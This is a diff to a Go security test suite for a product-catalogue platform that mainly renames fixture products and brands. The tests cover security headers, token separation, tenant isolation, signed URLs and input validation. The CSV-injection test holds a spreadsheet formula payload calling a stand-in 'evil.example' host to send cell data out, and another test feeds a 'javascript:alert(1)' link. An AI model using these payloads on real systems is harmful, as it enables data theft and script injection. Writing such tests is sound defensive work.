@@ -99,7 +99,7 @@ func testSecurityHeaders(t *T) {
 		t.Errorf("the admin UI sets no X-Content-Type-Options: nosniff")
 	}
 	if t.r.full != nil {
-		a := t.r.products["KO-1001"]
+		a := t.r.products["MN-1001"]
 		if a != nil && len(a.Assets) > 0 && a.Assets[0].Renditions.Web.URL != "" {
 			f := t.rawGet(a.Assets[0].Renditions.Web.URL, nil)
 			if f.status == http.StatusUnauthorized {
@@ -110,7 +110,7 @@ func testSecurityHeaders(t *T) {
 		}
 	}
 	c, _ := t.portalUser("OBX security: headers", nodeadmin.RetailerInput{})
-	status, h, _ := t.download(c, "/portal/assets/"+t.assetID("KO-1001_NVY_1")+"/download?variant=web")
+	status, h, _ := t.download(c, "/portal/assets/"+t.assetID("MN-1001_NVY_1")+"/download?variant=web")
 	checkContentHeaders(t, "portal image download", &response{status: status, header: h}, true)
 	checkNoCORS(t)
 }
@@ -180,7 +180,7 @@ func testTokenSeparation(t *T) {
 	}
 	tok, err := t.r.full.Token(t.ctx)
 	t.Check(err, "token")
-	if res := t.rawGet(t.r.cfg.BaseURL+obx.PathIngest+"/products/KO-1001", bearerHeader(tok)); res.status != http.StatusUnauthorized {
+	if res := t.rawGet(t.r.cfg.BaseURL+obx.PathIngest+"/products/MN-1001", bearerHeader(tok)); res.status != http.StatusUnauthorized {
 		t.Errorf("an access token on the ingest API: %d, want 401", res.status)
 	}
 	for _, p := range []string{"/settings", "/retailers", "/portal/products"} {
@@ -286,7 +286,7 @@ func testOwnership(t *T) {
 			if e, err = t.r.second.WaitExport(t.ctx, e.ID, 300*time.Millisecond); err == nil {
 				err = t.r.second.ExportManifest(t.ctx, e, func(l *obx.ExportManifestLine) error {
 					if l.Type == obx.KindProduct && bytes.Contains(l.Data, []byte(`"KT-`)) {
-						t.Errorf("the export of a key restricted to brand kestrel contains a Kestrel Trail product")
+						t.Errorf("the export of a key restricted to brand maison-noor contains a NOOR ATELIER product")
 					}
 					return nil
 				})
@@ -297,10 +297,10 @@ func testOwnership(t *T) {
 		}
 	}
 	if res, err := t.r.second.LookupGTINs(t.ctx, []string{"2000200101017"}); err == nil && len(res.Products) > 0 {
-		t.Errorf("a key restricted to brand kestrel found a Kestrel Trail EAN")
+		t.Errorf("a key restricted to brand maison-noor found a NOOR ATELIER EAN")
 	}
 	if d == nil || d.Has(obx.CapWebhooks) {
-		sub, err := t.r.full.CreateWebhook(t.ctx, obx.WebhookInput{URL: "https://hooks.kestrel.example/obx", Events: []string{obx.EventChangesAvailable}})
+		sub, err := t.r.full.CreateWebhook(t.ctx, obx.WebhookInput{URL: "https://hooks.maison-noor.example/obx", Events: []string{obx.EventChangesAvailable}})
 		if err == nil {
 			if list, err := t.r.second.Webhooks(t.ctx); err == nil {
 				for _, s := range list {
@@ -340,7 +340,7 @@ func testOwnership(t *T) {
 	var job struct {
 		ID string `json:"id"`
 	}
-	if err := a.Call(t.ctx, http.MethodPost, obx.PathAdminAPI+"/portal/download-jobs", map[string]any{"source": "products", "product_ids": []string{t.productID("KO-1001")}, "variant": "web"}, &job); err == nil && job.ID != "" {
+	if err := a.Call(t.ctx, http.MethodPost, obx.PathAdminAPI+"/portal/download-jobs", map[string]any{"source": "products", "product_ids": []string{t.productID("MN-1001")}, "variant": "web"}, &job); err == nil && job.ID != "" {
 		if status, _, _ := t.download(b, "/portal/download-jobs/"+job.ID); status != http.StatusNotFound {
 			t.Errorf("retailer B GET retailer A's download job: %d, want 404", status)
 		}
@@ -382,9 +382,9 @@ func testOwnership(t *T) {
 	var sel struct {
 		ProductIDs []string `json:"product_ids"`
 	}
-	a.Call(t.ctx, http.MethodPut, obx.PathAdminAPI+"/portal/selection", map[string]any{"product_ids": []string{t.productID("KO-1003")}}, nil)
+	a.Call(t.ctx, http.MethodPut, obx.PathAdminAPI+"/portal/selection", map[string]any{"product_ids": []string{t.productID("MN-1003")}}, nil)
 	b.Call(t.ctx, http.MethodGet, obx.PathAdminAPI+"/portal/selection", nil, &sel)
-	if obx.Contains(sel.ProductIDs, t.productID("KO-1003")) {
+	if obx.Contains(sel.ProductIDs, t.productID("MN-1003")) {
 		t.Errorf("retailer B sees retailer A's selection")
 	}
 }
@@ -393,7 +393,7 @@ func testSignedURLs(t *T) {
 	if t.r.full == nil {
 		t.Skip("needs an API key")
 	}
-	p1, p2 := t.r.products["KO-1001"], t.r.products["KO-1005"]
+	p1, p2 := t.r.products["MN-1001"], t.r.products["MN-1005"]
 	if p1 == nil || p2 == nil || len(p1.Assets) == 0 || len(p2.Assets) == 0 || p1.Assets[0].Renditions.Web.URL == "" {
 		t.Skip("fixture products missing")
 	}
@@ -624,7 +624,7 @@ func testCSVInjection(t *T) {
 		t.Skip("needs an upload key")
 	}
 	payload := `=HYPERLINK("https://evil.example/?"&A1,"Click")`
-	_, err := t.r.ing.Put(t.ctx, obx.KindProduct, "S-CSV-1", map[string]any{"brand_external_id": "kestrel", "style_number": "S-CSV-1", "name": map[string]any{"en": payload, "nl": "+SUM(1,1)"}}, nil)
+	_, err := t.r.ing.Put(t.ctx, obx.KindProduct, "S-CSV-1", map[string]any{"brand_external_id": "maison-noor", "style_number": "S-CSV-1", "name": map[string]any{"en": payload, "nl": "+SUM(1,1)"}}, nil)
 	t.Check(err, "PUT product")
 	defer t.r.ing.Delete(t.ctx, obx.KindProduct, "S-CSV-1")
 	c, _ := t.portalUser("OBX security: csv", nodeadmin.RetailerInput{})
@@ -683,7 +683,7 @@ func testLinkSchemes(t *T) {
 			t.Errorf("a brand website javascript: URL was accepted")
 			t.r.ing.Delete(t.ctx, obx.KindBrand, "s-urls-2")
 		}
-		_, err = t.r.ing.Put(t.ctx, obx.KindProduct, "S-URLS-2", map[string]any{"brand_external_id": "kestrel", "style_number": "S-URLS-2", "name": map[string]any{"en": "x"}, "dpp_url": "javascript:alert(1)"}, nil)
+		_, err = t.r.ing.Put(t.ctx, obx.KindProduct, "S-URLS-2", map[string]any{"brand_external_id": "maison-noor", "style_number": "S-URLS-2", "name": map[string]any{"en": "x"}, "dpp_url": "javascript:alert(1)"}, nil)
 		if err == nil {
 			t.Errorf("a product dpp_url javascript: URL was accepted")
 			t.r.ing.Delete(t.ctx, obx.KindProduct, "S-URLS-2")
